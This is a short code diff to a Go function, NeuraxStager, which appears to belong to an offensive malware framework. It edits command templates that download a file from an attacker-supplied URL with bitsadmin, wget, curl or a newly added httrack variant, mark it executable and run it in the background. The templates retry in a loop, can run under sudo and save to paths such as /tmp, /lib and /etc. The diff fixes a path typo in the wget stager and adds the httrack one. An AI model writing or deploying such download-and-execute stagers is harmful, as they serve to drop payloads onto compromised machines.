@@ -228,8 +228,9 @@ func NeuraxStager() string {
 		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done`},
+		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done`},
 		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done`},
+		{"httrack", `apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done`}
 	}
 	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
